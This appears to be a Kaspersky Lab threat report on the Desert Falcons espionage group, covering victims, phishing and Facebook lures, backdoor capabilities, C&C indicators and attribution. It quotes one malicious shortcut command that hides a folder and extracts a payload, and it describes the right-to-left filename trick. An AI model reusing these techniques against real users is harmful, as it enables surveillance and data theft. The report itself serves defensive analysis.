1. Executive Summary
Desert Falcons is a new group of cybermercenaries operating from the Middle East and using
a set of methods to hide and operate malware. The cybercriminals appear to be highly skilled:
in addition to proficient social engineering tricks, they have developed the following from
scratch:
• Computer systems malware targeting Windows devices
• Mobile malware targeting Android devices
• Infection vectors, including phishing emails, fake websites and fake social networking
accounts
Potential victims were enticed with socio-political news and information, and many
succumbed rapidly to malware infection.
The victims targeted include:
• Military and Government
• Newspaper, TV/Radio Channels and Top Media Outlets
• Financial and Trading Institutions
• Research and Education Institutions
• Activists and Political Leaders
• Energy Firms
• Physical Security Companies
Victims of the Desert Falcons are located mainly in the following countries:
• Egypt
• Palestine
• Israel
• Jordan
The Desert Falcons cybercriminals are native Arabic speakers; and it is believed to be the first
known Arab group to develop and run a full cyber espionage operation. Desert Falcons began
its operations in 2011, with the first infections taking place in 2013. The group became very
active in late 2014/early 2015.
The Desert Falcons comprises around 30 members working in three teams and operating
mainly out of Palestine, Egypt and Turkey.
The number of victims to date exceeds 3,000.
The group’s malware was originally found during an attack investigation in the Middle East.
Kaspersky Lab clients are protected from infection, with the malware files and domains used
in the targeted attacks detected and blocked.

2. Introduction
The geopolitical conflicts in the Middle East have deepened over the last few years. The crisis
is taking many forms, and the conflict in cyberspace is intensifying as different sides try to shift
the struggle in their favour by exploiting cyber intelligence and distorting news.
Targeted cyberattacks have also increased rapidly in the region over the last few years, with
victims identified for almost every one of the major advanced cyberattack campaigns (Regin,
Epic Turla, Careto, Nettraveler, Red October, Flame, Gauss, Duqu, and more.)
The Global Research and Analysis Team (GReAT) at Kaspersky Lab has uncovered new
targeted attacks in the Middle East. Native Arabic-speaking cybercriminals have built advanced
methods and tools to deliver, hide and operate malware that they have also developed
themselves. This malware was originally discovered during an investigation of one of the
attacks in the Middle East.
Political activities and news are being actively used by the cybercriminals to entice victims
into opening files and attachments. Content has been created with professionalism, with well
designed visuals and interesting, familiar details for the victims, as if the information were long
awaited.
The victims of the attacks to date have been carefully chosen; they are active and influential
in their respective cultures, but also attractive to the cybercriminals as a source of intelligence
and a target for extortion.
The attackers have been operating for more than two years now, running different
campaigns, targeting different types of victims and different types of devices (including
Windows- and Android-based). We suspect that at least 30 people distributed across
different countries are operating the campaigns.
As a security organization, our analysis has focused only on the malware and the facts
uncovered during our research.
The falcon is a popular and rare bird that has existed for a long time in Arabian countries
with deserts, such as Egypt, Syria, the United Arab Emirates, Palestine, Saudi Arabia, and
Oman, among others. It is also a symbol of hunting and sharp vision. The Desert Falcons are
proficient cyberattackers, with carefully chosen targets, who are all thoroughly investigated
before being attacked and infected.

3. Operation Goals and Victim Profiles
One of the most mysterious things about the Falcons is the range and variety of victims; with
clear political, geographical and social distinctions between them.

Further details of individual categories of victims
Victim Category

Victim Description

Media

Organizations and popular senior reporters from large and small, global and local media
organizations, with wide coverage in the Middle East region

A screenshot from one of the physical security providers targeted shows the attackers’ interest
in information about security officers and their assignments. It is possible that these victims
were targeted in order to collect useful information that could be used in actual physical crime.

3.1. Stolen Files information
The Desert Falcons’ operations were found to be mainly focused on political and military
intelligence. In all, the attackers were able to steal more than one million files and
documents containing sensitive information from victims’ computers and devices.

4. Operation Analysis
The Desert Falcons make use of different tools and techniques to Deliver, Infect, Spy on
and Manage their victims. Below we outline each of the methods involved and how they were
carefully used to operate the cyber espionage activities. They are grouped into three sections
as follows:
• Deceive and Infect
• Infiltrate and Spy
• Track and Control

4.1. Deceive and Infect
Malware writers use multiple technical and social engineering methods to deliver their files
and encourage the victims to run them; creating an effective infection vector, even when they
are targeting what should be well-protected organisations such as governments, banks and
leading media outlets. In this case the attackers depended mainly on social engineering to
exploit:
• Victims’ trust in social networking forums
• Victims’ curiosity about news relating to political conflict in their country
In the following sections we outline the different methods used by the cybercriminals to infect
their victims.

4.1.1. Targeted emails and documents
The Falcons attacks used spear phishing e-mails that attempted to trick the victim into opening
a malicious attachment. Spear phishing was mainly used when targeting important victims
such as governments or high profile media.
The spear phishing e-mails used by the Falcons were very well structured with filenames
and attachments selected with care for the targeted victim.

Below are some examples of the interesting content used to target important victims:
A PDF of a Meeting Record was used when targeting senior politicians in Egypt and Palestine.
The document was used in spear phishing and contains what appear to be the Meeting
Minutes for a very important meeting between political leaders in Egypt and Palestine.

Documents used when targeting activists in Israel and Palestine

4.1.2. Just click the shortcut: the rar/lnk trick
Another technique used by the cybercriminals is to send a rar file that extracts to multiple
files and offers an appealing shortcut in the form of a small, innocent-looking icon. In this
case the victim does not need to double-click an executable file, the shortcut is enough to
run a whole command to extract, setup and run the malware.

C:\Windows\System32\cmd.exe /c "md c:\LA&attrib c:\LA +h +s&C:\Progra~1\WinRAR\unrar.exe e _*.rar

4.1.3. Right-to-left extension override trick
This method takes advantage of special characters in Unicode to reverse the order of
characters in a file name, hiding the dangerous file extension in the file name and placing a
harmless-looking fake file extension near the end of the file name. By using this technique,
even careful users with good technical knowledge could be tricked into running malicious files.

4.1.4. Social Networking tricks
Targeted Facebook attacks aimed at specific people
The Desert Falcons team is among to the first to run targeted attacks through Facebook chat.
The attackers created authentic Facebook accounts and then interacted with chosen victims
through common Facebook pages until they had gained their trust. Then they sent them
Trojan files in the chat hidden as an image or similar.
Below are some screenshots of a victim’s PC showing the infection process, extracted from
one of the command and control servers:

Malware files being sent as me.rar or mypic.rar from fake accounts to the victims through chat

Facebook attacks targeted at generic activists and political followers (mass infection)
For wider infections, especially among activists and political figures, different social engineering
techniques were used. These included Facebook posts and redirects to fake pages with
political content. We were able to identify suspect Facebook posts on popular activist pages,
with links to domains or malware downloads used by Falcons. Below are a few examples:

former prime minister of the state of Palestine.

Another post with malicious content, this time on the page of Benjamin Netanyahu, the
current prime minister of Israel.

4.1.5. The fake RealPlayer plugin trick
In this case political social engineering was used to deliver malware as a “plugin” for the
“banned video” of a famous political show in Egypt hosted by the satirist Bassem Youssef.
The page was hosted on the following domain: www.linkedim.in, chosen to resemble the
popular LinkedIn social networking site.

4.2. Infiltrate and Spy
The Desert Falcons depend on two different backdoors to spy on victims. Both backdoors
are homemade and are under continuous development. We were able to identify and collect
more than 100 malware samples used by the Desert Falcons.
Once they have infected the victim’s computer, attackers have full access and control, and
they usually proceed as follows:
1. New victims are categorized into groups before being infected (e.g. A001, A002, and so on)
2. One of the cybercriminals is appointed to each new victim after infection
3. A complete list of all files (especially XLS, DOC, JPG and WAV) is retrieved from the victim’s
machine
4. The cybercriminal browses and collects any interesting pictures and files
5. The cybercriminal also collects chats and screenshots
6. Depending on the importance of the victim, the surveillance is then either intensified or
dropped

4.2.1. The Falcons’ main Trojan
This is the main Trojan used in the attacks, especially when targeting important
victims. Multiple versions of the Trojan were found, revealing ongoing development and
improvements.
The Falcons’ main Trojan is divided into two modules:

4.2.1.1. Falcons’ Downloader
This module is used for the initial infection. Once executed, the Falcons’ downloader will
send a registration request to the Command and Control (C&C) server with the victim’s IP
address and a harddisk ID. The downloader will request a registration confirmation from
the C&C. Encrypted versions of the latest Falcons’ backdoor will then be downloaded and
installed on the victim’s machine.

TLP: White
For any inquiries, please contact intelreports@kaspersky.com

15

4.2.1.2. Falcons’ Backdoor
The Falcons’ backdoor communicates with C&C servers using HTTP requests with encrypted
content, providing the attackers with full backdoor functionality including:
• Screenshots
• Keylogs
• Upload/Download files
• Information on all the .doc and .xls files on the victim’s hard disk or connected USB
devices
• The ability to steal passwords stored on the system registry (Internet Explorer and live
Messenger)
All the files and screenshots collected by the backdoor are sent to the C&C in a passwordprotected archive.
The earliest sample we found of the Falcons’ Trojan was compiled in Feb 2013. We consider
this to be the real start date for the infection activity. (c07ac2120b4312b33089c0
cc97405876, MSN.exe).

4.2.2. DHS spyware
DHS naming is used by the attackers to describe the nickname initials of one of the
developers (D** H*** Spyware).
From June 2014, the Falcons began using a new, totally rewritten backdoor, the “DHS
spyware”, is built by a different development team. This also provided the attackers with
control over the infected systems, serving the same goals as before through the following
functionalities:
• Screenshots and Keylogs
• Audio recording
• Downloading and Uploading files
• Password stealing
• Interactive shell

4.2.3. DHS2015, also called iRat
Beginning 2015, DHS released a new, almost final version of the Trojan malware, now
packed with new features and techniques to escape detection, but also adding encryption
to the C&C communication and file storage. The new malware has been named DHS2015 or
iRAT.

4.2.4. Mobile backdoor traces
During the investigation of the C&C servers we found traces of data pointing to mobile Trojan
logs on the C&C www.fpupdate.info. The traces represent a structure for a mobile spying
command server, the server contains mobile Call logs, SMS logs and Geolocation tracking
for more than 360 victims.

4.2.5. Other tools by DHS
The cybercriminals also developed other tools, for example, a public/private key-based file
cryptor/decryptor tool.

4.2.6. Compilation timeline for samples
The malware files compilation timeline for the collected samples clearly shows the Falcons’
activity and operations, which started in 2013 and increased dramatically in 2014.

4.3. Track and Control
The Desert Falcons’ operation can be divided into three different campaigns, each operated
from a different C&C/IP, targeting different types of victims and operated mostly by different
team members.
The campaigns can be classified by the type and version of malware and the type of victims
targeted:
• Campaign 1: A
 ctive in Palestine, Egypt, Jordan and the Gulf states (KSA, UAE and Qatar)
• Campaign 2: Active in Israel
• Campaign 3: Active in Egypt

4.3.1. 1st Campaign - targeting computer devices and mobiles
This is the main Falcons’ campaign and included the highest number of victims. It focused
mainly high profile victims in Palestine, Jordan, Egypt and the Gulf states, and the target
victims were mainly government organizations, military centers and top media outlets.

Besides being the only campaign to use DHS spyware, we can confirm this is also the most
recent, managed by new and less experienced group members. This is apparent from
mistakes made in the campaign operation. For example, the C&C server advtravel.info was
publicly accessible, despite containing files, screenshots and information collected from the
victims and the backdoor execution logs.

File and folder structure on one of the command servers. For a short time the file access
permissions for the command servers were made public.

4.3.4 Liptona.net
One of the interesting findings that could indicate an earlier start to the Falcons’ operations
is the Liptona.net domain. The hosting history for this domain shows that between 21 June
2012 and December 2013, this domain was pointing to one of the IPs (188.40.106.84) used
by the Falcons.
We were able to find a malware sample using Liptona.net as a C&C
(667b5004fa197beb0129e1ddbc416864). This sample has some similarities to the
Falcons’ main backdoor and the compilation time for the sample points back to Dec 2011.
One interesting thing is that this sample tries to steal login credentials for hardcoded URLs of
Palestinian websites, an indication of a shared goal with the Falcons’ team.
Websites hardcoded in the malware:
• http://mail.mtit.pna.ps/src/login.php (Email Ministry of Telecommunications and
Information Technology Palestine )
• http://myaccount.jawwal.ps/ (Jawwal Mobile provider)
• http://portal.iugaza.edu.ps/ (Islamic University of Gaza)

5. Attribution
The investigation into the Desert Falcons cybermercenaries enabled the research team to
determine the identity of some members of the group behind the development and operation
of the campaigns.
The Desert Falcons team members count around 30, working in three teams and operating
mainly from Palestine, Egypt and Turkey.
We also confirmed that the cybercriminals are native Arabic speakers from the Middle East,
based on evidence from:
• The identities found
• The fact that most malware files have the PE resource “Version Info” with “Lang property”
set to “Arabic”
• Arabic User names for the C&C administrators
• Arabic names and emails found in the registration history of the C&C domains
• Solid Arabic phishing emails and documents used in attacks
• DHS spyware command and control panel with Arabic interface

The identities of some of the cybercriminals were found when inspecting the contents of one
of the C&Cs which had public read permissions open for a short period of time. We were able
to track and identify the full profile of some of the attackers including Facebook and twitter
accounts, private blogs and websites. Surprisingly the attackers have published on twitter
some information about their development of the spyware and the command servers.

6. Conclusion
The Desert Falcons’ attacks show clearly that zeroday techniques are not a must for efficient
targeted attacks. Using phishing emails, social engineering and homemade tools and
backdoors, the Desert Falcons were able to infect hundreds of sensitive and important
victims in the Middle East region through their computer systems or mobile devices.
This is just an alert for the poor cyber security situation in the region. Banks, Media outlets,
Governments and Military entities in different countries all fell prey to the Desert Falcons’
attacks.
Falcons’ threat actors are determined, active and have good technical knowledge. We expect
their operations to carry on developing more Trojans and using more advanced techniques.
With enough funding, they might be able to acquire or develop exploits that would increase
the efficiency of their attacks
Desert Falcons is just one example of the rise of cybercrime in a geopolitically troubled
region that will motivate other threat actors or states to leverage cyber attacks for political or
criminal goals.
Kaspersky Lab detects all the malware files as follows:
• Trojan.Win32.DesertFalcons
• Trojan-Spy.Win32.Agent.cncc
